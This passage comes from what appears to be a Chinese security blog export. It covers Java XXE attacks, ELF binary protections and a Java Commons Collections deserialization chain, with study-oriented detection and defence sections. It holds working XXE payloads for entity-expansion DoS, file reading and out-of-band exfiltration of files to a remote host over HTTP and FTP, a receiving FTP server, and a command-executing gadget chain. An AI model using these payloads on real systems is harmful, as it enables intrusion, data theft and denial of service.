&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt; &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt; &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt; &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt; ]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; 这个在其他编程语言或者JDK版本较低的Java中可利用，但在高版本JDK的环境中会报错中断解析： 当然，这种类型的DoS攻击也支持参数实体的方式。将dos.xml修改如下： 1234&lt;!DOCTYPE data SYSTEM &quot;http://192.168.17.136:8000/dos.dtd&quot; [&lt;!ELEMENT data (#PCDATA)&gt;]&gt;&lt;data&gt;&amp;tea;&lt;/data&gt; 在攻击者服务器放置dos.dtd： 123456&lt;!ENTITY % a0 &quot;dos&quot; &gt;&lt;!ENTITY % a1 &quot;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;&quot;&gt;&lt;!ENTITY % a2 &quot;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;&quot;&gt;&lt;!ENTITY % a3 &quot;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;&quot;&gt;&lt;!ENTITY % a4 &quot;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;&quot;&gt;&lt;!ENTITY tea &quot;%a4;&quot; &gt; 自己可更换低版本JDK进行测试，这里就不演示了。 （2）支持实体测试主要是利用普通实体ELEMENT，如果解析过程变的非常缓慢，则表明测试成功，即目标解析器配置不安全可能遭受至少一种DDoS攻击： 1234567&lt;!DOCTYPE data [&lt;!ELEMENT data (#ANY)&gt;&lt;!ENTITY a0 &quot;dos&quot; &gt;&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;]&gt;&lt;data&gt;&amp;a2;&lt;/data&gt; （3）XML 二次爆破 DDoS 攻击1234&lt;!DOCTYPE data [&lt;!ENTITY a0 &quot;dosdosdosdosdosdos...dos&quot;]&gt;&lt;data&gt;&amp;a0;&amp;a0;...&amp;a0;&lt;/data&gt; （4）一般实体递归最好不要使用递归： 12345&lt;!DOCTYPE data [&lt;!ENTITY a &quot;a&amp;b;&quot; &gt;&lt;!ENTITY b &quot;&amp;a;&quot; &gt;]&gt;&lt;data&gt;&amp;a;&lt;/data&gt; （5）外部一般实体这种攻击方式是通过申明一个外部一般实体，然后引用位于网上或本地的一个大文件(例如：C:/pagefile.sys 或 /dev/random)。换句话说，就是让解析器解析一个 巨大的 XML 文件从而导致DoS。 12345&lt;?xml version=&apos;1.0&apos;?&gt;&lt;!DOCTYPE data [&lt;!ENTITY dos SYSTEM &quot;file:///publicServer.com/largeFile.xml&quot; &gt;]&gt;&lt;data&gt;&amp;dos;&lt;/data&gt; 2、基本XXE攻击有回显的XXE攻击这种攻击就是漏洞验证时利用的第3、4步的示例，如： 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY foo &quot;Entity can be hacked&quot;&gt; ]&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;&amp;foo;&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; 但是这种攻击方式是需要一个直接的反馈通道即可以回显数据，并且读取文件受到XML中禁止字符的限制，如 “&lt;” 和 “&amp;”。如果这些被禁止的字符出现在要访问的文件中(如：/etc/fstab)，则 XML 解析器会抛出一个错误并停止解析。 使用 netdoc 的 XXE 攻击主要将file://换成netdoc:/，如下： 12345678910&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data [ &lt;!ELEMENT data (#PCDATA)&gt; &lt;!ENTITY file SYSTEM &quot;netdoc:/e:/passwd&quot;&gt; ]&gt;&lt;user&gt; &lt;name&gt;netdoc&lt;/name&gt; &lt;sex&gt;netdoc&lt;/sex&gt; &lt;age&gt;&amp;file;&lt;/age&gt;&lt;/user&gt; 3、高级XXE攻击——直接反馈通道这类攻击为高级的 XXE 攻击，用于绕过对基本的XXE攻击的限制和OOB（外带数据）攻击。 绕过基本 XXE 攻击的限制在有回显的基础上，将外部实体读取本地文件的部分拆分一下，如下： bypass.xml 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE data [ &lt;!ELEMENT data (ANY)&gt; &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % goodies SYSTEM &quot;file:///e:/passwd&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.43.201/xxe/bypass.dtd&quot;&gt; %dtd;]&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;&amp;all;&lt;/age&gt;&lt;/user&gt; bypass.dtd 1&lt;!ENTITY all &apos;%start;%goodies;%end;&apos;&gt; 运行即可触发XXE，并在回显中显示泄露的内容： 滥用属性值的 XXE 攻击bypass2.xml 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE data [ &lt;!ENTITY % remote SYSTEM &quot;http://192.168.43.201/xxe/bypass2.dtd&quot;&gt; %remote; ]&gt;&lt;data attrib=&apos;&amp;internal;&apos;/&gt; bypass2.dtd 123&lt;!ENTITY % payload SYSTEM &quot;file:///e:/passwd&quot;&gt;&lt;!ENTITY % param1 &quot;&lt;!ENTITY internal &apos;%payload;&apos;&gt;&quot;&gt;%param1; 未尝试成功。。。 4、高级XXE攻击——外带数据(OOB)通道即没有回显的XXE情况。 此时先将Demo代码的输出注释掉： XXE OOB 攻击主要是通过URL参数的形式将数据外带出去。 需要注意，这种方法外带数据遇到特殊字符就会报错，服务端接收不到外带数据！ oob.xml 123&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE data SYSTEM &quot;http://192.168.43.201/xxe/oob.dtd&quot;&gt;&lt;data&gt;&amp;send;&lt;/data&gt; oob.dtd 123&lt;!ENTITY % file SYSTEM &quot;file:///e:/secret.ini&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;http://192.168.43.201:8000/?%file;&apos;&gt;&quot;&gt;%all; 先外带无特殊字符的文件内容，可以看到通过URL参数的形式外带出来了： 当外带如passwd等含有换行符或尖括号等文件内容时会报错，接收不到数据： XXE OOB 攻击——参数实体和前者类似，区别仅在于只使用参数实体，即这里的send为参数实体。 oob2.xml 1234567&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data [ &lt;!ENTITY % remote SYSTEM &quot;http://192.168.43.201/xxe/oob2.dtd&quot;&gt; %remote; %send; ]&gt;&lt;data&gt;6&lt;/data&gt; oob2.dtd 123&lt;!ENTITY % payload SYSTEM &quot;file:///e:/secret.ini&quot;&gt;&lt;!ENTITY % param1 &quot;&lt;!ENTITY % send SYSTEM &apos;http://192.168.43.201:8000/?%payload;&apos;&gt;&quot;&gt;%param1; 但是本地测试出现问题，没成功： XXE OOB 攻击——参数实体 FTP最为经典的XXE攻击方式，通过FTP外带数据，攻击者可以读取到任意长度的文件而不受限于只读一行内容。 这里在本地进行测试。 ftp.xml 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[ &lt;!ENTITY % file SYSTEM &quot;file:///e:/passwd&quot;&gt; &lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1/xxe/ftp.dtd&quot;&gt; %remote; %all; ]&gt;&lt;root&gt;&amp;send;&lt;/root&gt; ftp.dtd 1&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;ftp://127.0.0.1:21/%file;&apos;&gt;&quot;&gt; 运行可以看到，FTP服务端日志只能接收到一行的内容，因为其默认处理的方式会受到换行符等字符的影响： 自行编写FTPServer处理字符输出格式 FtpServer.java 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import java.io.BufferedReader;import java.io.InputStreamReader;import java.io.PrintWriter;import java.net.ServerSocket;import java.net.Socket;public class FtpServer &#123; public static void main(String[] args) throws Exception &#123; ServerSocket serverSocket = new ServerSocket(21); Socket socket = serverSocket.accept(); BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream())); PrintWriter out = new PrintWriter(socket.getOutputStream(), true); out.println(\"220 Ftp Server Running!\"); System.out.println(in.readLine()); out.println(\"331 User\"); System.out.println(in.readLine()); out.println(\"230 Login In\"); String s1 = \"\"; String s2 = \"\"; while (true)&#123; String str = in.readLine();// System.out.println(str); if (str != null &amp;&amp; str.trim().toUpperCase().startsWith(\"EPSV ALL\"))&#123; if (!s1.isEmpty() || !s2.isEmpty())&#123; System.out.println(s1 + s2); &#125; out.println(\"221 Bye!\"); out.close(); in.close(); break; &#125; else if (str != null &amp;&amp; str.trim().toUpperCase().startsWith(\"CWD\"))&#123; if (s1.isEmpty())&#123; s1 = str.substring(4); &#125; else &#123; s2 += \"/\" + str.substring(4); &#125; &#125; else &#123; if (s1.isEmpty())&#123; System.out.println(str); &#125; else &#123; System.out.println(s1 + s2); s1 = str; s2 = \"\"; &#125; &#125; out.println(\"200 OK!\"); &#125; &#125;&#125; 再次运行，可以接收到所有文件内容： 0x05 检测方法1、在Java项目中搜索javax.xml.parsers下的DocumentBuilderFactory和DocumentBuilder，排查是否使用了该API解析XML文档内容； 2、若使用了，则进一步排查是否禁用了不安全的操作，具体的是看setFeature()的设置是否存在绕过的可能。 0x06 防御方法正确地设置setFeature()来进行防御，在创建出新的DocumentBuilderFactory实例之后就调用： 1234567891011121314151617181920212223public static void documentBuilder(File f)&#123; DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); try &#123; //防御XML注入 factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); factory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); factory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); factory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false); DocumentBuilder builder = factory.newDocumentBuilder(); //解析xml文档，先获取 Document doc = builder.parse(f); //通过user名字来获取dom节点 NodeList nodeList = doc.getElementsByTagName(\"user\"); Element e = (Element)nodeList.item(0); //获取值 System.out.println(\"姓名：\"+e.getElementsByTagName(\"name\").item(0).getFirstChild().getNodeValue()); System.out.println(\"性别：\"+e.getElementsByTagName(\"sex\").item(0).getFirstChild().getNodeValue()); System.out.println(\"年龄：\"+e.getElementsByTagName(\"age\").item(0).getFirstChild().getNodeValue()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125;&#125; 再次测试之前的payload，都没有成功： 至于setFeature()的详细配置可查阅：http://xerces.apache.org/xerces2-j/features.html 0x07 参考DTD/XXE 攻击笔记分享 XML外部实体（XXE）注入详解","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"XML注入","slug":"XML注入","permalink":"https://www.mi1k7ea.com/tags/XML注入/"}]},{"title":"ELF安全防御机制小结","date":"2019-02-09T03:30:47.000Z","path":"2019/02/09/ELF安全防御机制小结/","text":"这里主要介绍一下Linux下ELF文件的一些安全防御机制及其原理，其在二进制安全和Pwn上经常会碰到，至于各个类型的绕过技巧后面会补充。 NX（DEP）NX即No-eXecute（不可执行）的意思，NX（即Windows上类似的DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 通常开启了NX后，即使有栈溢出漏洞也执行不了写在栈上的shellcode，但是可通过ROP方式来绕过NX跳转至其他地方执行。 gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。例如：gcc -z execstack -o test test.c 在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。 原理如图： 网上找的示例图： PIE（ASLR）（1）ASLR（Address Space Layout Randomization）：地址随机化，通常用来防御return2libc攻击，有以下3种配置： ​ 0 - 表示关闭进程地址空间随机化。 ​ 1 - 表示将mmap的基址，stack和vdso页面随机化。 ​ 2 - 表示在1的基础上增加栈（heap）的随机化。 （2）PIE（Position-Independent Executables）：位置无关的可执行文件，和Windows下的ASLR（Address Space Layout Randomization)机制类似，PIE enabled表示程序开启地址随机化选、意味着程序每次运行的时候地址都会变化。主要是为了解决二进制本身地址已知的问题，可用来防御return2elf和其他已知地址读写问题。 默认情况下，PIE未开启，x86加载的基地址为0x8048000，而x64加载的基址为0x400000。 开启PIE后，elf中相对偏移不变，但加载机制每次均变化。 一般情况下NX（DEP）和PIE（ASLR）会同时工作。 PIE机制有以下三种情况： ​ 0 - 表示关闭进程地址空间随机化。 ​ 1 - 表示将mmap的基址，stack和vdso页面随机化。 ​ 2 - 表示在1的基础上增加栈（heap）的随机化。 可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。 Built as PIE：位置独立的可执行区域PIE。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程ROP（return-oriented programming）方法变得难得多。 liunx下关闭PIE的命令如下：sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space RELRORELRO（Relocation Read Only）重定向只读，实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读，用来防御hijack GOT攻击。通过设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，保护库函数的调用不受攻击者重定位的影响，从而减少对GOT（Global Offset Table）攻击。 动态函数在第一次懒加载过程中，会使用到重定位表格进行符号搜索，并将搜索到的函数信息保存到重定位项中，第二次直接跳转到重定位项中。而攻击者可以修改重定位表格或重定位项来实现hijack GOT表攻击。 RELRO有Partial RELRO和FULL RELRO两个选项，如果开启FULL RELRO，意味着无法修改GOT表；如果为Partial RELRO，说明对GOT表具有写权限。在Linux下默认开启状态。 Partial RELRO：重定位表格只读，重定位项可读写； FULL RELRO：重定位表格和重定位项均为只读（但会导致符号懒加载失效，同时会带来启动时的效率下降）； 可通过ROP绕过。 FORTIFYFortify 技术是GCC在编译源码时判断程序的哪些buffer会存在可能的溢出，在buffer大小已知的情况下，GCC会把 strcpy、memcpy,、memset等函数自动替换成相应的 __strcpy_chk(dst, src, dstlen)等函数，达到防止缓冲区溢出的作用。 FORTIFY_SOURCE机制对格式化字符串有两个限制： ​ (1)包含%n的格式化字符串不能位于程序内存中的可写地址； ​ (2)当使用位置参数时，必须使用范围内的所有参数。例如要使用%4$x，则必须同时使用1、2、3。 GCC中-D_FORTIFY_SOURCE=2是默认开启的，但是只有开启O2或以上优化的时候，这个选项才会被真正激活。 如果指定-D_FORTIFY_SOURCE=1，那同样也要开启O1或以上优化，这个选项才会被真正激活。 可以使用-U_FORTIFY_SOURCE或者-D_FORTIFY_SOURCE=0来禁用。 如果开启了-D_FORTIFY_SOURCE=2，那么调用__printf_chk函数的时候会检查format string中是否存在%n，如果存在%n 而且format string是在一个可写的segment中的（不是在read-only内存段中），那么程序会报错并终止。如果是开启-D_FORTIFY_SOURCE=1，那么就不会报错。 CANARY（Stack）Stack，栈溢出检查，用Canary是否变化来检测，其中Canary found表示开启。 Canary是一种缓冲区溢出攻击缓解手段：启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux将cookie信息称为Canary。 如图： 在GCC中开启Canary有3中选项： 禁用Canary：gcc -fno-stack-protector -o test test.c 启用Canary，但只为局部变量中含有char数组的函数插入保护代码：gcc -fstack-protector -o test test.c 启用Canary，为所有函数插入保护代码：gcc -fstack-protector-all -o test test.c 如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过。 参考Pwn基础知识笔记 软件常用安全防护手段 checksec 总结","tags":[{"name":"二进制","slug":"二进制","permalink":"https://www.mi1k7ea.com/tags/二进制/"}]},{"title":"Java反序列化漏洞","date":"2019-02-06T04:14:03.000Z","path":"2019/02/06/Java反序列化漏洞/","text":"在学习Java反序列化漏洞之前，建议先熟悉Java序列化和反序列化机制。 在反序列化漏洞中，Java类反序列化漏洞较PHP和Python的相比，显得稍微复杂一些。主要是要求对Java较为熟悉。下面小结一下Java反序列化漏洞的相关内容。 0x01 何为Java反序列化漏洞当开发者自定义实现Serializable、添加自己的readObject()方法时，若readObject()方法内代码逻辑存在缺陷，则可能存在Java反序列化漏洞的风险。如果此时Java服务的反序列化API允许外部用户使用，则会导致攻击者使用精心构造的payload来利用反序列化漏洞达到任意代码执行的目的。 Java反序列化中readObject()方法的作用相当于PHP反序列化中的魔术函数，使反序列化过程在一定程度上受控成为可能，是否真的可控，还需分析每个对象的readObject()方法具体是如何实现的。通常情况下，在Java的readObject()方法中很少会像CTF中PHP的反序列化漏洞题目一样直接将漏洞代码写在该方法中，这时就需要去构造反射链来进行任意代码执行。 0x02 重写readObject()示例Java反序列化漏洞的根源在于重写readObject()方法导致存在漏洞代码。 readObject()方法重写的格式如下： 1private void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException 注意，readObject()方法被定义成了private，并且是必须尝试捕获IOException和ClassNotFoundException的异常。 这里再贴另外一个简单的示例，创建一个不安全的类对象，赋值其name属性并序列化为文件保存起来，接着通过反序列化该文件获取该对象及其属性值，通过重写readObject()方法在调用默认的readObject()方法之后添加一条执行计算器的代码： 1234567891011121314151617181920212223242526272829303132333435import java.io.*;public class test &#123; public static void main(String args[]) throws Exception&#123; UnsafeClass Unsafe = new UnsafeClass(); Unsafe.name = \"Mi1k7ea\"; System.out.println(\"[*]序列化对象\"); FileOutputStream fos = new FileOutputStream(\"object.ser\"); ObjectOutputStream os = new ObjectOutputStream(fos); os.writeObject(Unsafe); os.close(); fos.close(); System.out.println(\"[*]反序列化文件中保存的序列化对象\"); FileInputStream fis = new FileInputStream(\"object.ser\"); ObjectInputStream ois = new ObjectInputStream(fis); UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); fis.close(); &#125;&#125;class UnsafeClass implements Serializable&#123; public String name; //重写readObject()方法 private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123; //执行默认的readObject()方法 in.defaultReadObject(); //执行命令 Runtime.getRuntime().exec(\"calc.exe\"); &#125;&#125; 可以看到，在readObject()方法调用时Java的序列化机制会先寻找用户是否自定义了readObject()方法，若有则直接调用该自定义的方法而非默认的readObject()方法： 0x03 Apache Commons Collections反序列化漏洞分析Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，包含了很多jar工具包，提供了很多强有力的数据结构类型并且实现了各种集合工具类。 org.apache.commons.collections提供一个类包来扩展和增加标准的Java的collection框架，也就是说这些扩展也属于collection的基本概念，只是功能不同罢了。Java中的collection可以理解为一组对象，collection里面的对象称为collection的对象。具象的collection为set、list、queue等等，它们是集合类型。换一种理解方式，collection是set、list、queue的抽象。 作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发，而正是因为在大量web应用程序中这些类的实现以及方法的调用，导致了反序列化用漏洞的普遍性和严重性。 影响版本：3.2.1及以下版本的Commons Collections包。 下面就简单地模拟该序列化漏洞产生、payload的构造及利用过程。这里示例用的commons-collections-3.2.1.jar包。 漏洞点Apache Commons Collections中有一个特殊的接口Transformer，其中有一个实现该接口的类InvokerTransformer可以通过调用Java的反射机制来调用任意函数，其源码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public class InvokerTransformer implements Transformer, Serializable &#123; private static final long serialVersionUID = -8653385846894047688L; private final String iMethodName; private final Class[] iParamTypes; private final Object[] iArgs; public static Transformer getInstance(String methodName) &#123; if (methodName == null) &#123; throw new IllegalArgumentException(\"The method to invoke must not be null\"); &#125; else &#123; return new InvokerTransformer(methodName); &#125; &#125; public static Transformer getInstance(String methodName, Class[] paramTypes, Object[] args) &#123; if (methodName == null) &#123; throw new IllegalArgumentException(\"The method to invoke must not be null\"); &#125; else if (paramTypes == null &amp;&amp; args != null || paramTypes != null &amp;&amp; args == null || paramTypes != null &amp;&amp; args != null &amp;&amp; paramTypes.length != args.length) &#123; throw new IllegalArgumentException(\"The parameter types must match the arguments\"); &#125; else if (paramTypes != null &amp;&amp; paramTypes.length != 0) &#123; paramTypes = (Class[])((Class[])paramTypes.clone()); args = (Object[])((Object[])args.clone()); return new InvokerTransformer(methodName, paramTypes, args); &#125; else &#123; return new InvokerTransformer(methodName); &#125; &#125; private InvokerTransformer(String methodName) &#123; this.iMethodName = methodName; this.iParamTypes = null; this.iArgs = null; &#125; public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; &#125; public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; else &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var4) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); &#125; catch (IllegalAccessException var5) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); &#125; catch (InvocationTargetException var6) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", var6); &#125; &#125; &#125;&#125; 可以看到该InvokerTransformer类是实现Transformer接口的（Transformer接口主要用于转换并返回一个给定的Object对象），且其中的transform()方法采用反射机制进行任意函数调用，这就是漏洞点所在。 这里是反射机制关键的三句代码： 123Class cls = input.getClass();Method method = cls.getMethod(this.iMethodName, this.iParamTypes);return method.invoke(input, this.iArgs); 第一句：input为Object对象，获取其对应的Class； 第二句：获取cls类中具体的方法对象； 第三句：执行input对象的method方法，返回同method一样的返回类型。 上述三句代码其实等同于下面的代码，即可以直接合并起来： 1input.getClass().getMethod(this.iMethodName, this.iParamTypes).invoke(input, this.iArgs); 下面编写代码进行弹出计算器的测试来验证该漏洞点是否能利用： 123456789public class POC_Test&#123; public static void main(String[] args) throws Exception &#123; InvokerTransformer it = new InvokerTransformer( \"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc.exe\"&#125;); it.transform(java.lang.Runtime.getRuntime()); &#125;&#125; 可以看到是可以弹出计算器的，即可以进行漏洞利用，但是有个问题，就是我们不能从外部直接传入java.lang.Runtime.getRuntime()，这时就需要我们去构造链式结构的payload来实现漏洞利用。 下面就开始构造反射链payload来实现反序列化漏洞的利用。 1、通过反射构造可序列化的恶意反射链对象一步步来，我们知道，要让Java程序执行执行命令，通常是获取到Runtime的实例，再调用它的exec()执行命令： 12Runtime runtime = Runtime.getRuntime();runtime.exec(cmd); 接着将其表示为链式结构的形式，因为底层通过反射技术获取对象调用函数都会存在一个上下文环境，使用链式结构的语句可以保证执行过程中这个上下文是一致的： 1java.lang.Runtime.getRuntime().exec(cmd) 好了，我们知道构造的反射链是这种格式，下面开始分析Commons Collections的payload的链式结构。 Commons Collections中有一个用于对象之间转换的Transformer接口，先看构造的链式结构payload中涉及到的几个实现类，只需看其构造方法和transform()方法即可。 1、ConstantTransformer类，是一个Transformer接口实现类，其构造方法和transform()方法如下，可看到transform()方法会原封不动地返回传入的Object，从而可构造外部输入的常量如Runtime.class： 1234567public ConstantTransformer(Object constantToReturn) &#123; this.iConstant = constantToReturn;&#125;public Object transform(Object input) &#123; return this.iConstant;&#125; 2、InvokerTransformer类，在漏洞点中已说明。 3、ChainedTransformer类，是一个Transformer接口实现类，其构造方法和transform()方法如下，其transform()方法用于链接多个步骤构造的transformer，其中object参数为上一次调用transform()的返回结果： 12345678910public ChainedTransformer(Transformer[] transformers) &#123; this.iTransformers = transformers;&#125;public Object transform(Object object) &#123; for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123; object = this.iTransformers[i].transform(object); &#125; return object;&#125; 接着看下面这段构造的payload链式结构： 1234567Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;\"getRuntime\", new Class[0]&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc.exe\",&#125;),&#125;;Transformer transformerChain = new ChainedTransformer(transformers); 构造过程如下： 构造一个ConstantTransformer对象，把Runtime的Class对象传进去，在transform()时，始终会返回这个对象； 构造一个InvokerTransformer对象，待调用方法名为getMethod，参数为getRuntime，在transform()时，传入第一步的结果，此时的input应该是java.lang.Runtime，但经过getClass()之后，cls为java.lang.Class，之后getMethod()只能获取java.lang.Class的方法，因此才会定义的待调用方法名为getMethod，然后其参数才是getRuntime，它得到的是getMethod这个方法的Method对象，invoke()调用这个方法，最终得到的才是getRuntime这个方法的Method对象； 构造一个InvokerTransformer对象，待调用方法名为invoke，参数为空，在transform()时，传入第二步的结果，同理，cls将会是java.lang.reflect.Method，再获取并调用它的invoke()方法，实际上是调用上面的getRuntime()拿到Runtime对象； 构造一个InvokerTransformer对象，待调用方法名为exec，参数为命令字符串，在transform()时，传入第三步的结果，获取java.lang.Runtime的exec方法并传参调用； 最后把它们组装成一个数组全部放进ChainedTransformer中，在transform()时，会将前一个元素的返回结果作为下一个的参数，刚好满足需求。 有一个问题——上面的第2、3步是不是可以简化一下，考虑用下面这种逻辑更清晰的方式来构造呢？ 1234Transformer[] trans = new Transformer[] &#123; new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"getRuntime\", new Class[0], new Object[0]), new InvokerTransformer(\"exec\", new Class[] &#123; String.class &#125;, new Object[] &#123; cmd &#125;)&#125;; 答案是不行的。虽然单看整个链，无论是定义还是执行都是没有任何问题的，但是在后续序列化时，由于Runtime.getRuntime()得到的是一个对象，这个对象也需要参与序列化过程，而Runtime本身是没有实现Serializable接口的，所以会导致序列化失败。 构造完这条Transformer链，就等着谁来执行它的transform()了。 这里可以先直接在代码下面添加transformerChain.transform(null);语句来查看该Transformer链是否真的可以执行命令且该对象是否可以被序列化，代码示例如下： 1234567891011121314151617181920public class test &#123; public static void main(String args[]) throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;\"getRuntime\", new Class[0]&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc.exe\",&#125;), &#125;; Transformer transformerChain = new ChainedTransformer(transformers); //测试我们的恶意对象是否可以被序列化 ByteArrayOutputStream out = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(out); objOut.writeObject(transformerChain); //执行以下语句就可以调用起计算器 transformerChain.transform(null); &#125;&#125; 执行之后程序没报错，即该Transformer链可以进行序列化，并且在执行transformerChain.transform(null);时成功弹出计算器： 该Transformer链没有问题，下面就是找Commons Collections中哪些地方可以执行该Transformer链的transform()方法以及寻找含有自定义有漏洞的readObject()方法的类了。 2、查找自定义readObject()方法且存在漏洞代码的类如网上所说，在JDK较早的版本中存在AnnotationInvocationHandler类 ，其类对象在初始化时可以传入一个Map类型参数赋值给字段memberValues，readObject()过程中如果满足一定条件就会对memberValues中的元素进行setValue()。 但是，在较新版本的JDK中AnnotationInvocationHandler没有了setValue()方法，但是可以使用BadAttributeValueExpException类来实现。由于本地环境的JDK为较新的版本，因此就先对BadAttributeValueExpException类进行分析。 利用类1——BadAttributeValueExpException下面看下BadAttributeValueExpException类定义，可以看到定义了一个名为val的对象类型属性，且自定义了readObject()方法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public class BadAttributeValueExpException extends Exception &#123; /* Serial version */ private static final long serialVersionUID = -3105272988410493376L; /** * @serial A string representation of the attribute that originated this exception. * for example, the string value can be the return of &#123;@code attribute.toString()&#125; */ private Object val; /** * Constructs a BadAttributeValueExpException using the specified Object to * create the toString() value. * * @param val the inappropriate value. */ public BadAttributeValueExpException (Object val) &#123; this.val = val == null ? null : val.toString(); &#125; /** * Returns the string representing the object. */ public String toString() &#123; return \"BadAttributeValueException: \" + val; &#125; private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\"val\", null); if (valObj == null) &#123; val = null; 